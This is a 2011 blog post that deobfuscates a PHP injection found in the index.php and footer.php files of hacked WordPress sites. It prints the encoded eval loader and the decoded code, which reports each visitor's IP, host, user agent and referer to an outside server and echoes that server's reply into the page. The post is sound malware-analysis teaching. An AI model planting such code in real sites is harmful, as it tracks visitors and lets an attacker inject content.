---
id: 333
title: Pulling apart a WordPress hack, unobfuscating its code
published: true
publishedDate: 2011-11-19 03:17:00Z
lastModifiedDate: 2011-11-19 03:17:00Z
categories:
- PHP
- Programming
- WordPress

---

<p>Over the past few months, there have been a few vulnerabilies in PHP scripts utilised by various WordPress themes. One of the largest hacks was back in August, when a Remote File Inclusion (RFI) vulnerability was <a href="http://wpcandy.com/reports/timthumb-security-vulnerability-discovered">found in TimThumb</a>, a thumbnail generation script used by a lot of WordPress themes. This vulnerability allowed attackers to run <strong>any</strong> PHP code on vulnerable sites. As a result of this, <a href="http://www.theregister.co.uk/2011/11/02/wordpress_mass_compromise/">thousands of sites were hacked</a>.</p>
<p>The most common result of your site being hacked through like this is having some sort of malicious code added to your PHP files. This is often invisible, and people don't notice that their site has malicious code lurking in it until much later. However, sometimes the hacked code does have errors in it. One particular payload is being referred to as the "<a href="http://digwp.com/2011/11/clean-up-cannot-redeclare-hack/">'Cannot redeclare' hack</a>", as it causes an error like the following to appear in your site's footer:</p>
<blockquote>
Fatal error: Cannot redeclare _765258526()
(previously declared in /path/to/www/wp-content/themes/THEME/footer.php(12) 
: eval()'d code:1) in /path/to/www/index.php(18) 
: eval()'d code on line 1
</blockquote>
<p>This particular hack affects all the index.php and footer.php files in your WordPress installation. If you are affected by this hack and open any index.php or footer.php file, you'll see code that starts like this: (<a href="http://pastebin.com/8CCJz45k">the full code is on Pastebin</a>)</p>
<pre class="brush: php">
<?php eval(gzuncompress(base64_decode('eF5Tcffxd3L0CY5Wj...
</pre>

<h3>Decoding the Code</h3>
<p>If you're this far, I assume you're a PHP developer (or at least know the basics of PHP). The malicious code above is actually highly obfuscated PHP code, which means that the actual intent of the code is hidden and it looks like jibberish. The <strong>eval</strong> statement runs arbitrary PHP code, so this line of code will basically base64 decode and then run the big block of code. So... what does the code actually do? Obviously we can't tell with it in its current state. It does take a bit of effort, but this code can be "decoded" relatively easy. Obfuscation is not one-way, it can always be undone. While we can't get back the original variable names, we <em>can</em> see what functions the code is executing.</p>
<p>The first step in decoding this code is replacing all instances of <strong>eval</strong> with <strong>echo</strong>, and then running the script. This should output the code being executed, instead of actually executing it. After doing this, I ended up with something like the following:</p>
<pre class="brush: php">
$GLOBALS['_2143977049_']=Array();
function _765258526($i){$a=Array();return base64_decode($a[$i]);}

eval(gzuncompress(base64_decode('eF5Tcffxd3L0CY5WjzcyMjM...
</pre>
<p>Great, another layer of gzipped/base64'd obfuscation. This technique is common with obfuscated code like this. Multiple layers of obfuscation makes it harder for someone to decode the code, as it requires more effort. I guess the "bad guys" think that people will get tired of trying to unobfuscate the code, and give up, or something like that. When a case like this is encountered, keep replacing <strong>eval</strong> with <strong>echo</strong> and re-running the script, until there's no eval statements left. After decoding all the eval'd code and formatting the resulting code, I <a href="http://pastebin.com/sc0J6FB5">ended up with this</a>. While there's readable code there now, it's still obfuscated.</p>
<p>Once you're this far, if you look closely at the code, you'll notice that a lot of it is encoded using base64. The next step to unobfuscating thid code is to decode all base64-encoded text. That is, find all instances of base64_decode(...) and replace it with the base64 decoded version. Once I did that, I ended up with this:</p>
<pre class="brush: php">
<?php 
$GLOBALS['_226432454_']=Array();
function _1618533527($i)
{
        return '91.196.216.64';
}
 
$ip=_1618533527(0);
$GLOBALS['_1203443956_'] = Array('urlencode');
function _1847265367($i)
{
        $a=Array('http://','/btt.php?ip=','REMOTE_ADDR','&host=','HTTP_HOST','&ua=','HTTP_USER_AGENT','&ref=','HTTP_REFERER');
        return $a[$i];
}
$url = _1847265367(0) .$ip ._1847265367(1) .$_SERVER[_1847265367(2)] ._1847265367(3) .$_SERVER[_1847265367(4)] ._1847265367(5) .$GLOBALS['_1203443956_'][0]($_SERVER[_1847265367(6)]) ._1847265367(7) .$_SERVER[_1847265367(8)];
$GLOBALS['_399629645_']=Array('function_exists', 'curl_init', 'curl_setopt', 'curl_setopt', 'curl_setopt', 'curl_exec', 'curl_close', 'file_get_contents');
function _393632915($i)
{
    return 'curl_version';
}
if ($GLOBALS['_399629645_'][0](_393632915(0))) 
{
        $ch=$GLOBALS['_399629645_'][1]($url);
        $GLOBALS['_399629645_'][2]($ch,CURLOPT_RETURNTRANSFER,true);
        $GLOBALS['_399629645_'][3]($ch,CURLOPT_HEADER,round(0));
        $GLOBALS['_399629645_'][4]($ch,CURLOPT_TIMEOUT,round(0+0.75+0.75+0.75+0.75));
        $re=$GLOBALS['_399629645_'][5]($ch);
        $GLOBALS['_399629645_'][6]($ch);
}
else
{
        $re=$GLOBALS['_399629645_'][7]($url);  
}
echo $re;
?>
</pre>

<p>Now you simply need to go through the code and "execute it in your head". Follow the execution path of the code, and see which variables are used where. There's some usage of arrays to disguise certain variables. What I did was first replaced the two function calls (_1618533527 and _1847265367), and then replaced the array usages (_1203443956_, _399629645_ and _399629645_). Substitute the variables in the places they're used, and the code should be fully obfuscated. Once fully unobfuscated, the code came down to the following:</p>
<pre class="brush: php">
<?php
$url = 'http://91.196.216.64/btt.php?ip=' . $_SERVER['REMOTE_ADDR'] . '&host=' . $_SERVER['HTTP_HOST'] . '&ua=' . urlencode($_SERVER['HTTP_USER_AGENT']) . '&ref=' . $_SERVER['HTTP_REFERER'];

if (function_exists('curl_version'))
{
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_TIMEOUT, 3);
	$re = curl_exec($ch);
	curl_close($ch);
}
else
{
	$re = file_get_contents($url);
}
echo $re;
</pre>
<p>So, what it's actually doing is sending a request to <strong>91.196.216.64</strong> (a server located in Russia), telling it your site's hostname, your user agent (what browser you're using), and the referer (how you got to the page). This is not directly malicious (this code can't directly do anything bad), which makes it interesting. My theory is that the developer of the worm is using this to create a list of all vulnerable sites, to use them for further hacks in the near future.</p>
<p>So, that's it. Hopefully this post wasn't too boring (and perhaps you even learnt how to unobfuscate code like this). As more people learn how to unobfuscate code like this, I suspect that the "hackers" will keep getting smarter and devising more clever code obfuscation techniques. Until then, finding out what the code actually does is relatively quick and easy, as I've demonstrated here.</p>
<p>Until next time, <br /> &mdash; Daniel</p>
